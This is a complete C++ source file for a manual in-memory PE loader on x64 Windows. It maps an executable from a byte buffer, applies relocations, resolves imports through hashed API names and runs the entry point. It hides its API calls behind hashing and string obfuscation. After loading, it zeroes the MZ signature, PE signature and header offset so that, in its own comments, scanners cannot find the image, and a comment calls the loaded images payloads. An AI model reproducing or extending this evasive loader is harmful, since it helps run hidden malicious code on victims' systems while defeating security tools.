#include "pe_loader.h"
#include "dynapi.h"
#include "obfstr.h"

#include <Windows.h>
#include <cstring>

namespace pe_loader {

// ---- Resolved kernel32 APIs ----

using fn_VirtualAlloc         = LPVOID(WINAPI*)(LPVOID, SIZE_T, DWORD, DWORD);
using fn_VirtualFree          = BOOL  (WINAPI*)(LPVOID, SIZE_T, DWORD);
using fn_VirtualProtect       = BOOL  (WINAPI*)(LPVOID, SIZE_T, DWORD, PDWORD);
using fn_FlushInstructionCache= BOOL  (WINAPI*)(HANDLE, LPCVOID, SIZE_T);
using fn_GetCurrentProcess    = HANDLE(WINAPI*)();

static fn_VirtualAlloc          pVirtualAlloc          = nullptr;
static fn_VirtualFree           pVirtualFree           = nullptr;
static fn_VirtualProtect        pVirtualProtect        = nullptr;
static fn_FlushInstructionCache pFlushInstructionCache = nullptr;
static fn_GetCurrentProcess     pGetCurrentProcess     = nullptr;

static bool ensure_kernel32() {
    if (pVirtualAlloc) return true;
    auto k32 = dynapi::get_module(dynapi::modules::KERNEL32);
    if (!k32) return false;

    pVirtualAlloc          = reinterpret_cast<fn_VirtualAlloc>         (dynapi::resolve(k32, API_HASH("VirtualAlloc")));
    pVirtualFree           = reinterpret_cast<fn_VirtualFree>          (dynapi::resolve(k32, API_HASH("VirtualFree")));
    pVirtualProtect        = reinterpret_cast<fn_VirtualProtect>       (dynapi::resolve(k32, API_HASH("VirtualProtect")));
    pFlushInstructionCache = reinterpret_cast<fn_FlushInstructionCache>(dynapi::resolve(k32, API_HASH("FlushInstructionCache")));
    pGetCurrentProcess     = reinterpret_cast<fn_GetCurrentProcess>    (dynapi::resolve(k32, API_HASH("GetCurrentProcess")));

    return pVirtualAlloc && pVirtualFree && pVirtualProtect
        && pFlushInstructionCache && pGetCurrentProcess;
}

// ---- Helpers ----

// FNV-1a hash — matches dynapi::hash_api so we can hash import names at runtime.
static uint32_t hash_name_runtime(const char* s) {
    uint32_t h = 2166136261u;
    while (*s) {
        h ^= static_cast<uint8_t>(*s++);
        h *= 16777619u;
    }
    return h;
}

static DWORD protect_from_characteristics(DWORD c) {
    bool e = (c & IMAGE_SCN_MEM_EXECUTE) != 0;
    bool r = (c & IMAGE_SCN_MEM_READ)    != 0;
    bool w = (c & IMAGE_SCN_MEM_WRITE)   != 0;
    if (e && w) return PAGE_EXECUTE_READWRITE;
    if (e && r) return PAGE_EXECUTE_READ;
    if (e)      return PAGE_EXECUTE;
    if (r && w) return PAGE_READWRITE;
    if (w)      return PAGE_READWRITE;
    if (r)      return PAGE_READONLY;
    return PAGE_NOACCESS;
}

// ---- Relocations ----

static bool apply_relocations(uint8_t* base, IMAGE_NT_HEADERS64* nt) {
    auto& dir = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
    if (dir.Size == 0 || dir.VirtualAddress == 0) return true; // no relocs

    uint64_t image_size = nt->OptionalHeader.SizeOfImage;
    if (dir.VirtualAddress > image_size ||
        (uint64_t)dir.VirtualAddress + dir.Size > image_size)
        return false;

    uint64_t delta = reinterpret_cast<uint64_t>(base) - nt->OptionalHeader.ImageBase;
    if (delta == 0) return true;

    auto block = reinterpret_cast<IMAGE_BASE_RELOCATION*>(base + dir.VirtualAddress);
    auto end   = reinterpret_cast<uint8_t*>(block) + dir.Size;

    while (reinterpret_cast<uint8_t*>(block) < end && block->SizeOfBlock != 0) {
        if (block->SizeOfBlock < sizeof(IMAGE_BASE_RELOCATION)) return false;
        if ((const uint8_t*)block + block->SizeOfBlock > end)   return false;
        uint32_t count = (block->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(uint16_t);
        auto entries = reinterpret_cast<uint16_t*>(block + 1);

        for (uint32_t i = 0; i < count; ++i) {
            uint16_t type   = entries[i] >> 12;
            uint16_t offset = entries[i] & 0x0FFF;

            if (type == IMAGE_REL_BASED_ABSOLUTE) continue; // padding
            if (type == IMAGE_REL_BASED_DIR64) {
                if ((uint64_t)block->VirtualAddress + offset + 8 > image_size) return false;
                auto target = reinterpret_cast<uint64_t*>(base + block->VirtualAddress + offset);
                *target += delta;
                continue;
            }
            return false; // unknown relocation type for x64
        }

        block = reinterpret_cast<IMAGE_BASE_RELOCATION*>(
            reinterpret_cast<uint8_t*>(block) + block->SizeOfBlock);
    }
    return true;
}

// ---- Imports ----

static bool resolve_imports(uint8_t* base, IMAGE_NT_HEADERS64* nt) {
    auto& dir = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    if (dir.Size == 0 || dir.VirtualAddress == 0) return true; // no imports

    uint64_t image_size = nt->OptionalHeader.SizeOfImage;
    if (dir.VirtualAddress > image_size ||
        (uint64_t)dir.VirtualAddress + dir.Size > image_size)
        return false;

    auto desc = reinterpret_cast<IMAGE_IMPORT_DESCRIPTOR*>(base + dir.VirtualAddress);

    for (; desc->Name != 0; ++desc) {
        auto mod_name = reinterpret_cast<const char*>(base + desc->Name);
        auto mod = dynapi::load_module(mod_name);
        if (!mod) return false;

        auto orig_thunk = desc->OriginalFirstThunk
            ? reinterpret_cast<IMAGE_THUNK_DATA64*>(base + desc->OriginalFirstThunk)
            : reinterpret_cast<IMAGE_THUNK_DATA64*>(base + desc->FirstThunk);
        auto iat_thunk  = reinterpret_cast<IMAGE_THUNK_DATA64*>(base + desc->FirstThunk);

        for (; orig_thunk->u1.AddressOfData != 0; ++orig_thunk, ++iat_thunk) {
            if (orig_thunk->u1.Ordinal & IMAGE_ORDINAL_FLAG64) {
                // TODO: ordinal import support (walk export table by ordinal).
                return false;
            }

            auto by_name = reinterpret_cast<IMAGE_IMPORT_BY_NAME*>(
                base + orig_thunk->u1.AddressOfData);
            auto fn = dynapi::resolve(mod, hash_name_runtime(reinterpret_cast<const char*>(by_name->Name)));
            if (!fn) return false;

            iat_thunk->u1.Function = reinterpret_cast<uint64_t>(fn);
        }
    }
    return true;
}

// ---- Public API ----

map_error map(const uint8_t* pe_bytes, size_t pe_size, mapped_image& out) {
    out = {};
    if (!pe_bytes || pe_size < sizeof(IMAGE_DOS_HEADER)) return map_error::bad_dos_header;
    if (!ensure_kernel32()) return map_error::alloc_failed;

    auto dos = reinterpret_cast<const IMAGE_DOS_HEADER*>(pe_bytes);
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return map_error::bad_dos_header;

    if (static_cast<size_t>(dos->e_lfanew) + sizeof(IMAGE_NT_HEADERS64) > pe_size)
        return map_error::bad_nt_header;

    auto nt_src = reinterpret_cast<const IMAGE_NT_HEADERS64*>(pe_bytes + dos->e_lfanew);
    if (nt_src->Signature != IMAGE_NT_SIGNATURE) return map_error::bad_nt_header;
    if (nt_src->FileHeader.Machine != IMAGE_FILE_MACHINE_AMD64) return map_error::bad_machine;

    SIZE_T image_size = nt_src->OptionalHeader.SizeOfImage;

    if (nt_src->FileHeader.SizeOfOptionalHeader != sizeof(IMAGE_OPTIONAL_HEADER64))
        return map_error::bad_nt_header;

    // Sanity cap: reject implausibly large SizeOfImage before touching the
    // allocator. Real payloads fit well under 256 MiB; this blocks resource
    // exhaustion from a hostile SizeOfImage (e.g. 0x7FFFFFFF).
    if (image_size == 0 || image_size > 0x10000000)
        return map_error::alloc_failed;

    // Always allocate at a kernel-chosen address and rely on relocations.
    auto base = static_cast<uint8_t*>(pVirtualAlloc(
        nullptr, image_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));
    if (!base) return map_error::alloc_failed;

    // Reject headers that overflow either the file or the mapped image.
    if (nt_src->OptionalHeader.SizeOfHeaders > pe_size ||
        nt_src->OptionalHeader.SizeOfHeaders > image_size) {
        pVirtualFree(base, 0, MEM_RELEASE);
        return map_error::bad_nt_header;
    }

    // Copy headers.
    memcpy(base, pe_bytes, nt_src->OptionalHeader.SizeOfHeaders);

    // Copy sections.
    auto nt_dst = reinterpret_cast<IMAGE_NT_HEADERS64*>(base + dos->e_lfanew);
    auto sec = IMAGE_FIRST_SECTION(nt_dst);
    for (uint16_t i = 0; i < nt_dst->FileHeader.NumberOfSections; ++i) {
        if (sec[i].SizeOfRawData == 0) continue;
        // Note: SizeOfRawData CAN exceed Misc.VirtualSize because raw data is
        // padded to FileAlignment while VirtualSize is the logical size — this
        // is normal PE layout, not a corruption signal. Only verify bounds.
        if (sec[i].VirtualAddress > image_size ||
            sec[i].SizeOfRawData > image_size ||
            (uint64_t)sec[i].VirtualAddress + sec[i].SizeOfRawData > image_size) {
            pVirtualFree(base, 0, MEM_RELEASE);
            return map_error::section_copy_failed;
        }
        if (static_cast<size_t>(sec[i].PointerToRawData) + sec[i].SizeOfRawData > pe_size) {
            pVirtualFree(base, 0, MEM_RELEASE);
            return map_error::section_copy_failed;
        }
        memcpy(base + sec[i].VirtualAddress,
               pe_bytes + sec[i].PointerToRawData,
               sec[i].SizeOfRawData);
    }

    // Apply base relocations.
    if (!apply_relocations(base, nt_dst)) {
        pVirtualFree(base, 0, MEM_RELEASE);
        return map_error::reloc_failed;
    }

    // Resolve imports.
    if (!resolve_imports(base, nt_dst)) {
        pVirtualFree(base, 0, MEM_RELEASE);
        return map_error::import_failed;
    }

    // Apply per-section page protections.
    for (uint16_t i = 0; i < nt_dst->FileHeader.NumberOfSections; ++i) {
        if (sec[i].Misc.VirtualSize == 0) continue;
        DWORD prot = protect_from_characteristics(sec[i].Characteristics);
        DWORD old  = 0;
        if (!pVirtualProtect(base + sec[i].VirtualAddress,
                             sec[i].Misc.VirtualSize, prot, &old))
        {
            pVirtualFree(base, 0, MEM_RELEASE);
            return map_error::protect_failed;
        }
    }

    // Headers page -> PAGE_READONLY, then anti-dump wipe (zero MZ + PE sig), then restore.
    DWORD old = 0;
    if (!pVirtualProtect(base, nt_dst->OptionalHeader.SizeOfHeaders, PAGE_READWRITE, &old)) {
        pVirtualFree(base, 0, MEM_RELEASE);
        return map_error::protect_failed;
    }
    auto dos_dst = reinterpret_cast<IMAGE_DOS_HEADER*>(base);
    dos_dst->e_magic  = 0;
    nt_dst->Signature = 0;
    // Kill e_lfanew too so a scanner that looks past MZ can't still reach the PE header.
    dos_dst->e_lfanew = 0;
    if (!pVirtualProtect(base, nt_dst->OptionalHeader.SizeOfHeaders, PAGE_READONLY, &old)) {
        pVirtualFree(base, 0, MEM_RELEASE);
        return map_error::protect_failed;
    }

    // Flush the icache so freshly-written .text pages execute correctly.
    pFlushInstructionCache(pGetCurrentProcess(), base, image_size);

    if (nt_src->OptionalHeader.AddressOfEntryPoint >= image_size) {
        pVirtualFree(base, 0, MEM_RELEASE);
        return map_error::bad_nt_header;
    }

    out.base        = base;
    out.size        = image_size;
    out.entry_point = base + nt_src->OptionalHeader.AddressOfEntryPoint;
    return map_error::ok;
}

bool execute(const mapped_image& img, bool is_dll) {
    if (!img.entry_point) return false;

    if (is_dll) {
        using dll_main_t = BOOL(WINAPI*)(HINSTANCE, DWORD, LPVOID);
        auto fn = reinterpret_cast<dll_main_t>(img.entry_point);
        return fn(reinterpret_cast<HINSTANCE>(img.base), DLL_PROCESS_ATTACH, nullptr) != FALSE;
    }

    using exe_entry_t = void(*)();
    auto fn = reinterpret_cast<exe_entry_t>(img.entry_point);
    fn();
    return true;
}

void unmap(mapped_image& img) {
    if (!img.base) return;
    if (!ensure_kernel32()) { img = {}; return; }

    // Best-effort scrub: make the whole region writable, then zero it.
    DWORD old = 0;
    if (pVirtualProtect(img.base, img.size, PAGE_READWRITE, &old)) {
        volatile uint8_t* p = static_cast<uint8_t*>(img.base);
        for (size_t i = 0; i < img.size; ++i) p[i] = 0;
    }
    pVirtualFree(img.base, 0, MEM_RELEASE);
    img = {};
}

} // namespace pe_loader
